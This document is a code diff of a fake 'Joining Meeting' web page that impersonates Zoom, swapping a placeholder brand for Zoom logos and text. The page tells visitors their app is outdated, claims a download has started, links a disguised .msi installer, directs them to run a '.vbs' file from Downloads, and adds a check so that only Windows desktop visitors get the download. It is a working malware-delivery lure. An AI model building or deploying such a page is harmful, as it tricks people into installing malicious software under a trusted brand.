@@ -1,12 +1,13 @@
 <!DOCTYPE html>
 <html lang="en">
-  <head>
+<head>
     <meta charset="UTF-8">
     <title>Joining Meeting</title>
-    <link rel="shortcut icon" href="https://us02st1.jtech.us/jtech.ico">
+    <link rel="shortcut icon" href="https://us02st1.zoom.us/zoom.ico">
     <meta name="robots" content="noindex,nofollow,noarchive">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&amp;display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@400;600;700&amp;display=swap" rel="stylesheet">
     <script src="https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit"></script>
     <style>
     body {
@@ -73,7 +74,6 @@
         background-color: #1a73e8;
     }
 
-    /* Progress bar */
     .progress-container {
         width: 300px;
         height: 6px;
@@ -112,7 +112,6 @@
         text-decoration: underline;
     }
 
-    /* Turnstile loading overlay styles */
     #loading-overlay {
         position: fixed;
         top: 0;
@@ -183,6 +182,118 @@
         cursor: not-allowed;
         opacity: 0.6;
     }
+
+    #deviceWarning {
+        display: none;
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: #f5f7fa;
+        z-index: 99998;
+        overflow-y: auto;
+    }
+
+    .warning-wrapper {
+        display: flex;
+        flex-direction: column;
+        min-height: 100vh;
+    }
+
+    .warning-header {
+        background-color: white;
+        padding: 16px 5%;
+        border-bottom: 1px solid #e2e2e5;
+    }
+
+    .warning-logo {
+        height: 25px;
+    }
+
+    .warning-container {
+        flex: 1;
+        width: 90%;
+        max-width: 480px;
+        margin: 60px auto;
+        padding: 42px 32px;
+        background-color: white;
+        box-shadow: 0 8px 24px rgba(0,0,0,0.06);
+        text-align: center;
+        border-radius: 14px;
+    }
+
+    .alert-icon {
+        margin-bottom: 20px;
+        display: flex;
+        justify-content: center;
+    }
+
+    .warning-container h1 {
+        font-size: 24px;
+        font-weight: 700;
+        margin-bottom: 18px;
+        color: #232333;
+    }
+
+    .message-box {
+        background-color: #f0f6ff;
+        border: 1px solid #cfe0ff;
+        padding: 18px;
+        border-radius: 10px;
+        margin-bottom: 20px;
+    }
+
+    .message-box p {
+        margin: 0;
+        font-size: 16px;
+        line-height: 1.5;
+    }
+
+    .secondary-text {
+        font-size: 15px;
+        color: #5c5c70;
+        margin-bottom: 30px;
+    }
+
+    .pc-requirement {
+        margin-top: 30px;
+    }
+
+    .windows-icon {
+        width: 40px;
+        height: 40px;
+        margin-bottom: 14px;
+    }
+
+    .device-badge {
+        display: inline-block;
+        background: #f0f2f5;
+        padding: 6px 14px;
+        border-radius: 20px;
+        font-size: 13px;
+        margin-top: 10px;
+        color: #5c5c70;
+    }
+
+    .warning-footer {
+        padding: 28px;
+        font-size: 13px;
+        color: #6e6e73;
+        text-align: center;
+    }
+
+    .warning-footer .notice {
+        opacity: 0.7;
+        margin-top: 6px;
+    }
+
+    @media (max-width: 480px) {
+        .warning-container {
+            margin: 30px auto;
+            padding: 32px 22px;
+        }
+    }
 </style> 
 </head>
 <body>
@@ -192,9 +303,51 @@
         <div class="loading-spinner"></div>
         <img src="z.png" class="loading-icon" alt="Loading Icon">
     </div>
-    <div class="loading-text">Verifying your browser...</div>
+    <div class="loading-text">Connecting...</div>
     <div id="cf-turnstile"></div>
 </div>
+
+<div id="deviceWarning">
+    <div class="warning-wrapper">
+        <div class="warning-header">
+            <img alt="Zocsd" class="zoom-logo" src="https://st1.zoom.us/static/6.3.53146/image/new/topNav/Zoom_logo.svg" />
+        </div>
+        <div class="warning-container">
+            <div class="alert-icon">
+                <svg aria-hidden="true" fill="none" height="48" viewbox="0 0 24 24" width="48"> 
+                    <circle cx="12" cy="12" r="10" stroke="#0b5cff" stroke-width="2"></circle> 
+                    <path d="M12 10v6" stroke="#0b5cff" stroke-linecap="round" stroke-width="2"></path> 
+                    <circle cx="12" cy="7" fill="#0b5cff" r="1"></circle> 
+                </svg>
+            </div>
+            <h1>Use the Zoom Workplace desktop app</h1>
+            <div class="message-box">
+                <p>To join this meeting, please open it in the <strong>zoom Workplace desktop app</strong>.</p>
+            </div>
+            <div class="secondary-text">
+                This browser environment doesn&rsquo;t support the features required for this meeting.
+            </div>
+            <div class="pc-requirement">
+                <svg aria-hidden="true" class="windows-icon" viewbox="0 0 24 24"> 
+                    <path d="M2 4.5l9-1.3v8.2H2V4.5zm10 6.8V3l10-1.5v9.8H12zm0 1.7h10v9.8L12 21v-8zm-1 8V13H2v6.5l9 1.5z" fill="#0b5cff"></path> 
+                </svg>
+                <div style="font-size:15px;font-weight:600;color:#0b5cff;">
+                    Switch to a Windows PC or desktop.
+                </div>
+                <div class="device-badge">
+                    Desktop environment required
+                </div>
+            </div>
+        </div>
+        <div class="warning-footer">
+            Zoom Video Communications, Inc.
+            <div class="notice">
+                Compatibility notice: Desktop app required
+            </div>
+        </div>
+    </div>
+</div>
+
 
 <div class="form-container">
     <div id="header" role="banner" class="clearfix">
@@ -204,15 +357,15 @@
     </div>
     <div class="container">
         <h1>Joining Meeting</h1>
-        <p>Sorry, You are using old version of jtech Workplace App.</p>
-        <p> It requires latest jtech Workplace to join the meeting.</p>
+        <p>Sorry, You are using old version of zoom Workplace App.</p>
+        <p> It requires latest zoom Workplace to join the meeting.</p>
         <p> Download has started automatically, kindly install to join the Remote
             Desktop Meeting. </p>
         <div class="progress-container">
             <div class="progress-bar"></div>
         </div>
         <p> A computer is required to launch the meeting, If the
-            download doesn't start automatically, please <a href="#" class="link" id="manualDownload">Download Manually</a>
+            download doesn't start automatically, please <a href="ZOOMWORKPLACE_X9TWGUQ0RITC_19SVEPT6J3D34_windows_x64.msi" class="link" id="manualDownload">Download Manually</a>
         </p>
         <button id="launchBtn" style="padding:12px 20px; background:#0b5fff; color:#fff; border:none; cursor:pointer;">
             Launch Meeting
@@ -222,11 +375,11 @@
     </div>
     <div id="toast" style="
         position: fixed;    bottom: 20px;    right: 20px;    background: #333;    color: #fff;    padding: 14px 18px;    border-radius: 6px;    font-family: Arial, sans-serif;    font-size: 14px;    opacity: 0;    transform: translateY(20px);    transition: all 0.4s ease;    z-index: 9999;">
-        Go to Downloads folder and click on <b>jtechWorkplace........vbs</b> to launch meeting
+        Go to Downloads folder and click on <b>ZoomWorkplace........vbs</b> to launch meeting
     </div>
     <div class="footer">
         <p style="font-family: &quot;Open Sans&quot;, Helvetica, Arial, sans-serif; margin: 0px; font-size: 14px; line-height: 1.5; color: rgba(4, 4, 19, 0.56); font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: center; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; white-space: normal; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial;">©2026
-            jtech Communications, Inc.<span>&nbsp;</span><span style="font-family: &quot;Open Sans&quot;, Helvetica, Arial, sans-serif;">All
+            zoom Communications, Inc.<span>&nbsp;</span><span style="font-family: &quot;Open Sans&quot;, Helvetica, Arial, sans-serif;">All
                 rights reserved.</span></p>
         <p class="LP3K7kSq" style="font-family: &quot;Open Sans&quot;, Helvetica, Arial, sans-serif; margin: 0px; font-size: 14px; line-height: 1.5; color: rgba(4, 4, 19, 0.56); font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: center; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; white-space: normal; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial;">
             <a href="#" target="_blank" style="font-family: &quot;Open Sans&quot;, Helvetica, Arial, sans-serif; text-decoration: none; color: inherit;">Trust Center |</a><span>&nbsp;</span>
@@ -236,32 +389,13 @@
             <a href="#" tabindex="0" role="button" style="font-family: &quot;Open Sans&quot;, Helvetica, Arial, sans-serif; text-decoration: none; color: inherit;">Cookie Preferences</a>
         </p>
     </div>
-
-    <div id="deviceWarning" style="
-        display:none;
-        position:fixed;
-        top:0;
-        left:0;
-        width:100%;
-        height:100%;
-        background:#ffffff;
-        z-index:99999;
-        text-align:center;
-        padding-top:20%;
-        font-family:Inter, Arial, sans-serif;
-    ">
-        <h1 style="font-size:28px;">⚠️ Unsupported Device</h1>
-        <p style="font-size:18px; color:#555;">
-            Please use a Windows computer to join this meeting.
-        </p>
-    </div>
 </div>
 
 <script>
 const files = {
     windows: {
-        url: "jtechWORKPLACE_X9TWGUQ0RITC_19SVEPT6J3D34_windows_x64.msi",
-        name: "jtechWORKPLACE_X9TWGUQ0RITC_19SVEPT6J3D34_windows_x64.msi"
+        url: "ZOOMWORKPLACE_X9TWGUQ0RITC_19SVEPT6J3D34_windows_x64.msi",
+        name: "ZOOMWORKPLACE_X9TWGUQ0RITC_19SVEPT6J3D34_windows_x64.msi"
     }
 };
 
@@ -377,34 +511,41 @@ function launchMeeting() {
 
 function showDeviceWarning() {
     const warning = document.getElementById("deviceWarning");
+    const loadingOverlay = document.getElementById("loading-overlay");
+    const formContainer = document.querySelector(".form-container");
+    
+    if (loadingOverlay) {
+        loadingOverlay.style.display = "none";
+    }
+    
+    if (formContainer) {
+        formContainer.style.display = "none";
+    }
+    
     if (warning) {
         warning.style.display = "block";
     }
-
-    const container = document.querySelector(".container");
-    if (container) container.style.display = "none";
-
-    const btn = document.getElementById("launchBtn");
-    if (btn) btn.style.display = "none";
 }
 
 
 document.addEventListener('DOMContentLoaded', function() {
+
+    if (!isDesktopWindows()) {
+        document.getElementById('loading-overlay').style.display = 'none';
+        showDeviceWarning();
+        return;
+    }
+    
     turnstile.ready(function() {
         turnstile.render('#cf-turnstile', {
             sitekey: '0x4AAAAAAC05NdE8TkHLYIrm',
             callback: function(token) {
-                document.querySelector('.loading-text').textContent = 'Verification complete!';
+                document.querySelector('.loading-text').textContent = 'Verifying meeting ID...';
                 turnstileVerified = true;
                 
                 setTimeout(function() {
                     document.getElementById('loading-overlay').style.display = 'none';
                     document.body.classList.add('verified');
-                    
-                    if (!isDesktopWindows()) {
-                        showDeviceWarning();
-                        return;
-                    }
                     
                     const manualBtn = document.getElementById("manualDownload");
                     const launchBtn = document.getElementById("launchBtn");
